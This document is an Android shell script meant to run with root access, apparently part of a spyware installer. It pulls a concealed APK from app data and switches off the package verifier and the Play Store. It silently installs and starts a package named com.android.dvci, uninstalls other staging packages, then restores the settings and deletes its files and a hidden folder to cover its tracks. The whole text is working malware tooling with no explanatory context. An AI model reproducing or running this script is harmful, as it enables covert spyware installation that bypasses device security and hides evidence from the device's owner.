export LD_LIBRARY_PATH=/vendor/lib:/system/lib

rm /data/local/tmp/adb-tmp.apk
cat /data/data/*/app_qza/core.*.apk > /data/local/tmp/adb-tmp.apk
chmod 666 /data/local/tmp/adb-tmp.apk

settings put global package_verifier_enable 0
pm disable com.android.vending
sleep 1

pm install -r -f /data/local/tmp/adb-tmp.apk
sleep 2

installed=$(pm list packages com.android.dvci)
if [ ${#installed} -gt 0 ]; then
	# correctly installed
	am startservice com.android.dvci/.ServiceMain
	am broadcast -a android.intent.action.USER_PRESENT

	for geb in $(ls /data/data/*/files/geb); do
		init=${geb#/data/data/}
	    package=${init%%/*}

	    if [ "$package" != "com.android.dvci" ]; then
		    pm disable $package
		    pm uninstall $package
		fi
	done
fi

sleep 2
settings put global package_verifier_enable 1
pm enable com.android.vending

rm /data/local/tmp/adb-tmp.apk
rm -r /sdcard/.lost.found






